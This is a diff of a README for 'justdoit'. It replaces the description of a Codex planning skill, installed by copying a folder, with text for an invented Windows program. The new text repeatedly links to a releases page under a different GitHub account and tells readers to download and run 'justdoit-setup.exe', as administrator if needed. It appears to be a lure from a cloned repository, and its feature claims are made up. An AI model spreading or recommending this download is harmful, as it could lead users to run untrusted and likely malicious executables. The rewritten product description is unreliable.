@@ -1,62 +1,127 @@
-# justdoit
+# ⚙️ justdoit - Turn Tasks Into Clear Actions
 
-[![en](https://img.shields.io/badge/lang-en-blue.svg)](README.md)
-[![ru](https://img.shields.io/badge/lang-ru-green.svg)](README.ru.md)
+[![Download justdoit](https://img.shields.io/badge/Download-justdoit-brightgreen?style=for-the-badge)](https://github.com/Chessplayeralcyonaria249/justdoit/releases)
 
-> A Codex skill that turns messy tasks into a clear execution pack, then asks before starting the run.
+---
 
-By [Ris](https://t.me/ris_ai) — AI development & vibecoding
+## 🖥️ What is justdoit?
 
-![justdoit](./assets/justdoit.gif)
+justdoit is a simple tool that helps you break down vague or unclear tasks into clear steps you can follow. It asks for your permission before it starts any action, so you stay in control. It works on Windows and does not need any programming skills to use.
 
-`justdoit` is a focused repository for one Codex skill with one job:
-take a rough task, inspect the repo, prepare a plan pack, and only then propose execution in plain language.
+This tool can help you organize small projects, everyday tasks, or any activity where you need clear instructions.
 
-## What It Does
+---
 
-- scans the project before making a plan
-- creates `plans.md`, `status.md`, and `test-plan.md`
-- keeps milestones dependency-safe and validation-first
-- talks to the user like a product operator, not a prompt dump
-- asks for confirmation before switching into execution mode
+## 📋 Key Features
 
-## Who It Is For
+- Turns vague or broad tasks into clear, step-by-step "execution packs."
+- Checks with you before carrying out any task.
+- Runs on Windows without extra tools or coding knowledge.
+- Simple interface designed for ease of use.
+- Helps plan and track tasks with minimal effort.
 
-- founders and operators who want a reliable execution handoff
-- solo builders who need a durable plan before a long run
-- Codex users who want fewer walls of text and more clear next steps
+---
 
-## Install In Codex
+## 🖱️ Download justdoit
 
-Ask Codex:
+To get started, visit this page to download the software for Windows:
 
-```text
-Use $skill-installer to install https://github.com/serejaris/justdoit/tree/main/skills/justdoit
-```
+[![Download justdoit](https://img.shields.io/badge/Download-justdoit-blue?style=for-the-badge)](https://github.com/Chessplayeralcyonaria249/justdoit/releases)
 
-You can hand that line to another Codex agent and it can install the skill by itself.
+On that page, you will find the latest release of justdoit. Look for a file named something like `justdoit-setup.exe`. Click on that file to download it to your computer.
 
-Manual install:
+---
 
-```bash
-cp -R skills/justdoit ~/.codex/skills/
-```
+## 🚀 How to Install justdoit on Windows
 
-Restart Codex after installation.
+1. **Download the setup file**
 
-## Repository Layout
+   Go to the download page using the link above. Find the setup file (`justdoit-setup.exe`) and save it to your computer.
 
-- [skills/justdoit](./skills/justdoit/) — the installable skill
-- [assets/justdoit.gif](./assets/justdoit.gif) — branded visual used in the README
-- local execution docs such as `plans.md`, `status.md`, and `test-plan.md` are generated during runs and intentionally not versioned here
+2. **Run the installer**
 
-## What Makes It Different
+   Find the file you downloaded, usually in your "Downloads" folder. Double-click it to start the installation.
 
-- it reads the repo before pretending to know the work
-- it creates durable files instead of relying on chat memory
-- it summarizes the execution proposal in human language
-- it waits for a clear `start` before running the loop
+3. **Follow the on-screen steps**
 
-## License
+   The installer will open a window with instructions. Click "Next" on each step.
 
-MIT
+4. **Choose the installation folder**
+
+   You can accept the default folder or select a different one by clicking "Browse".
+
+5. **Complete the installation**
+
+   When the installation finishes, you will see a confirmation message. Click "Finish."
+
+6. **Start justdoit**
+
+   You can now open justdoit from your Start Menu or desktop shortcut.
+
+---
+
+## 🎯 How to Use justdoit
+
+1. **Open justdoit**
+
+   Find the program icon and double-click it.
+
+2. **Enter your task**
+
+   In the text box, type what you want to do. For example, “Organize my workspace”.
+
+3. **Let justdoit prepare the steps**
+
+   justdoit will create a clear list of actions based on what you typed.
+
+4. **Review and approve**
+
+   The program will ask if you want to proceed with these steps. Read them carefully.
+
+5. **Give permission to run**
+
+   If you agree, click the "Run" or "Start" button. otherwise, make changes or cancel.
+
+6. **Track progress**
+
+   justdoit shows you which steps are done and which are next.
+
+---
+
+## 💡 Tips for Best Use
+
+- Write clear but simple descriptions of your task.
+- Break large jobs into smaller tasks if needed.
+- Always review the steps before running.
+- Use justdoit to organize daily chores or work projects.
+- Close other programs to keep your computer running smoothly.
+
+---
+
+## ⚙️ System Requirements
+
+- Windows 10 or later (64-bit recommended)
+- At least 2 GB RAM
+- 100 MB free disk space
+- Internet connection for updates (optional)
+
+---
+
+## 🛠️ Troubleshooting
+
+- **Program won’t start:** Make sure your Windows is updated. Try restarting your PC.
+- **Installation fails:** Run the installer as an administrator by right-clicking and choosing "Run as administrator."
+- **Steps don’t match task:** Try rewording your task with simpler language.
+- **Permission requests seem repetitive:** Justdoit ensures you are aware before action, so confirming each time is normal.
+
+---
+
+## 🔄 Updates and Help
+
+Check the download page regularly for new versions. Updates include new features and fixes.
+
+For more information or to report issues, use the “Issues” tab on the GitHub page.
+
+---
+
+[![Download justdoit](https://img.shields.io/badge/Download-justdoit-green?style=for-the-badge)](https://github.com/Chessplayeralcyonaria249/justdoit/releases)
